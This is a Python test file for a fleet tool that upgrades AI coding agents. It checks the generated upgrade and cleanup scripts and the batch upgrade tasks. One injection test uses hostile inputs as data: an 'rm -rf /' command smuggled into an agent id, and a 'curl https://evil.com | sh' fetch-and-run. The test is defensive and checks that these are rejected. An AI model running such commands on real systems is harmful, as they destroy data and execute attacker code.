"""Tests for action_service: remote upgrade and injection prevention."""

from __future__ import annotations

import pytest

from agent_fleet.remotes.probe import PATH_BOOTSTRAP
from agent_fleet.services.action_service import (
    UPGRADE_RULES,
    WIN_PATH_BOOTSTRAP,
    build_upgrade_script,
    get_upgrade_task,
)


def test_build_upgrade_script_posix_npm():
    script = build_upgrade_script("codex", "posix")
    assert PATH_BOOTSTRAP in script
    assert "npm install -g @openai/codex@latest" in script


def test_build_upgrade_script_posix_claude():
    script = build_upgrade_script("claude", "posix")
    assert "claude update" in script
    assert "@anthropic-ai/claude-code@latest" in script


def test_build_upgrade_script_posix_opencode():
    script = build_upgrade_script("opencode", "posix")
    assert "opencode upgrade" in script
    assert "npm install -g opencode-ai@latest" in script


def test_build_upgrade_script_windows_opencode():
    script = build_upgrade_script("opencode", "windows")
    assert "& opencode upgrade" in script
    assert "opencode-ai@latest" in script


def test_build_upgrade_script_windows():
    script = build_upgrade_script("codex", "windows")
    assert "npm.cmd install -g @openai/codex@latest" in script
    assert "$ProgressPreference = \"SilentlyContinue\"" in script
    assert "AppData\\Roaming\\npm" in script
    assert ".opencode\\bin" in script
    assert ".local\\bin" in script
    # Windows doesn't use the POSIX bash PATH_BOOTSTRAP
    assert PATH_BOOTSTRAP not in script


def test_build_upgrade_script_windows_claude():
    script = build_upgrade_script("claude", "windows")
    assert "& claude update" in script
    assert "@anthropic-ai/claude-code@latest" in script


def test_build_upgrade_script_posix_pi():
    script = build_upgrade_script("pi", "posix")
    assert "pi update" in script
    assert "npm install -g @earendil-works/pi-coding-agent@latest" in script


def test_build_upgrade_script_posix_hermes_never_uses_pip():
    """PyPI's hermes-agent is stuck at 0.19.0; pip would downgrade the fleet."""
    script = build_upgrade_script("hermes", "posix")
    assert "hermes update" in script
    assert "scripts/install.sh" in script
    assert "pip install --upgrade hermes-agent" not in script
    assert "git pull" not in script


def test_build_upgrade_script_windows_hermes_never_uses_pip():
    script = build_upgrade_script("hermes", "windows")
    assert "& hermes update" in script
    assert "scripts/install.sh" in script
    assert "pip install --upgrade hermes-agent" not in script


def test_build_upgrade_script_posix_codex_stops_app_server_on_success():
    import re

    script = build_upgrade_script("codex", "posix")
    assert "_upgrade_rc=$?" in script
    assert 'if [ "$_upgrade_rc" -eq 0 ]; then' in script
    assert "codex app'-'server daemon stop" in script
    assert "pkill -f '[c]odex.*app[-]server'" in script
    # Guard against Linux procps pkill -f (where .* crosses newlines) matching an ancestor sh -c/bash -c cmdline
    assert re.search(r"codex.*app-server", script, re.DOTALL) is None
    assert 'exit "$_upgrade_rc"' in script
    assert "systemctl" not in script
    assert "paseo" not in script


def test_build_upgrade_script_posix_opencode_stops_serve_without_restarting_paseo():
    import re

    script = build_upgrade_script("opencode", "posix")
    assert "_upgrade_rc=$?" in script
    assert 'if [ "$_upgrade_rc" -eq 0 ]; then' in script
    assert "opencode service stop" in script
    assert "pkill -f '[o]pencode.*s[e]rve'" in script
    assert re.search(r"opencode.*serve", script, re.DOTALL) is None
    assert 'exit "$_upgrade_rc"' in script
    assert "systemctl" not in script
    assert "paseo" not in script


def test_build_upgrade_script_windows_codex_stops_app_server_excluding_windowsapps():
    script = build_upgrade_script("codex", "windows")
    assert "$upgradeExit = if ($null -eq $LASTEXITCODE)" in script
    assert "if ($upgradeExit -eq 0)" in script
    assert "& codex app-server daemon stop" in script
    assert "codex.*app-server" in script
    assert "WindowsApps" in script
    assert "exit $upgradeExit" in script


def test_build_upgrade_script_windows_opencode_stops_serve():
    script = build_upgrade_script("opencode", "windows")
    assert "$upgradeExit = if ($null -eq $LASTEXITCODE)" in script
    assert "if ($upgradeExit -eq 0)" in script
    assert "& opencode service stop" in script
    assert "opencode.*serve" in script
    assert "exit $upgradeExit" in script
    assert "paseo" not in script


def test_build_upgrade_script_other_agents_skip_daemon_cleanup():
    for agent_id in ("claude", "pi", "hermes", "qoder", "codebuddy", "agy"):
        posix = build_upgrade_script(agent_id, "posix")
        assert "pkill" not in posix
        assert "app-server" not in posix
        assert "service stop" not in posix
        win = build_upgrade_script(agent_id, "windows")
        assert "Stop-Process" not in win
        assert "service stop" not in win


def test_posix_post_upgrade_cleanup_preserves_exit_code():
    import subprocess
    from agent_fleet.services.action_service import _post_upgrade_cleanup

    for agent_id, pat in (
        ("codex", "[c]odex.*app[-]server"),
        ("opencode", "[o]pencode.*s[e]rve"),
    ):
        cleanup = _post_upgrade_cleanup(agent_id, "posix")
        # Use a sentinel pattern that never matches any running process so we don't kill real daemons
        safe_cleanup = (
            cleanup.replace(pat, "[z]zzzz_nonexistent_agent_fleet_test_proc")
            .replace("codex app'-'server daemon stop", "true")
            .replace("opencode service stop", "true")
        )

        ok_res = subprocess.run(["bash", "-c", f"true\n{safe_cleanup}"], capture_output=True, text=True)
        assert ok_res.returncode == 0

        fail_res = subprocess.run(["bash", "-c", f"(exit 42)\n{safe_cleanup}"], capture_output=True, text=True)
        assert fail_res.returncode == 42


def test_build_upgrade_script_injection_rejected():
    with pytest.raises(ValueError, match="does not support automated upgrades"):
        build_upgrade_script("malicious_agent; rm -rf /", "posix")

    with pytest.raises(ValueError):
        build_upgrade_script("curl https://evil.com | sh", "posix")


def test_get_upgrade_task_unknown():
    assert get_upgrade_task("nonexistent") is None


def test_start_batch_upgrade_empty_and_dedup():
    from agent_fleet.services.action_service import start_batch_upgrade

    # Empty list
    assert start_batch_upgrade([]) == []

    # Nonexistent IDs skipped gracefully without crashing
    tasks = start_batch_upgrade(["fake_1", "fake_2", "fake_1"])
    assert tasks == []


def test_start_upgrade_task_without_event_loop_marks_failed(fleet_db):
    """Calling start_upgrade_task without a running event loop must NOT leave task stuck in running."""
    from agent_fleet import models
    from agent_fleet.db import session_scope
    from agent_fleet.services import action_service, operation_service

    with session_scope() as s:
        host = models.Host(id="h-noloop", name="host-noloop", enabled=True)
        rt = models.Runtime(id="rt-noloop", key="native", host_id="h-noloop", transport="local", enabled=True)
        inst = models.AgentInstallation(
            id="inst-noloop",
            runtime_id="rt-noloop",
            agent_id="codex",
            version="0.1.0",
            detected=True,
        )
        s.add_all([host, rt, inst])

    op = operation_service.record_operation(
        operation_type="agent_upgrade",
        target_type="runtime",
        target_id="rt-noloop",
        target_name="host-noloop:codex",
        status="running",
        details={"installation_id": "inst-noloop"},
    )

    task = action_service.start_upgrade_task("inst-noloop", operation_id=op["id"])
    assert task["status"] == "failed"
    assert task["ok"] is False
    assert task["finished_at"] is not None
    assert "event loop" in (task["error"] or "").lower()

    final_op = operation_service.get_operation(op["id"])
    assert final_op["status"] == "failed"


def test_batch_upgrade_routes_execute_in_async_event_loop(client, monkeypatch):
    """All 4 batch upgrade endpoints must run in an async event loop and schedule background tasks."""
    import time
    from unittest.mock import AsyncMock
    from agent_fleet import models
    from agent_fleet.db import session_scope
    from agent_fleet.remotes.executor import ExecResult
    from agent_fleet.services import action_service

    with session_scope() as s:
        host = models.Host(id="h-batch-api", name="host-batch-api", enabled=True)
        rt = models.Runtime(id="rt-batch-api", key="native", host_id="h-batch-api", transport="local", enabled=True)
        inst = models.AgentInstallation(
            id="inst-batch-api",
            runtime_id="rt-batch-api",
            agent_id="codex",
            version="0.1.0",
            detected=True,
        )
        s.add_all([host, rt, inst])

    executed = []

    class FakeRunner:
        async def run_script(self, script, timeout):
            executed.append(script)
            return ExecResult(stdout="upgraded", exit_code=0)

    mock_scan = AsyncMock()
    mock_scan.ok = True
    monkeypatch.setattr(action_service, "build_runner", lambda *args, **kwargs: FakeRunner())
    monkeypatch.setattr(action_service, "scan_runtime", AsyncMock(return_value=mock_scan))
    monkeypatch.setattr(action_service, "persist_result", lambda *args, **kwargs: None)
    monkeypatch.setattr(action_service, "find_outdated_installations", lambda **kwargs: ["inst-batch-api"])

    endpoints = [
        ("/api/upgrades/batch", {"installation_ids": ["inst-batch-api"]}),
        ("/api/machines/h-batch-api/upgrade-all", {}),
        ("/api/agents/codex/upgrade-all", {}),
        ("/api/fleet/upgrade-all", {}),
    ]

    for url, body in endpoints:
        action_service._tasks.clear()
        before = len(executed)
        res = client.post(url, json=body)
        assert res.status_code == 200, f"{url} failed: {res.text}"
        data = res.json()
        assert data["queued"] == 1
        task_id = data["tasks"][0]["task_id"]

        # Wait briefly for the scheduled background task to finish on the event loop
        for _ in range(40):
            t = action_service.get_upgrade_task(task_id)
            if t and t.get("status") in ("completed", "failed"):
                break
            time.sleep(0.025)

        final_task = action_service.get_upgrade_task(task_id)
        assert final_task is not None
        assert final_task["status"] == "completed", f"{url} task did not complete: {final_task}"
        assert len(executed) > before, f"{url} never executed upgrade script"

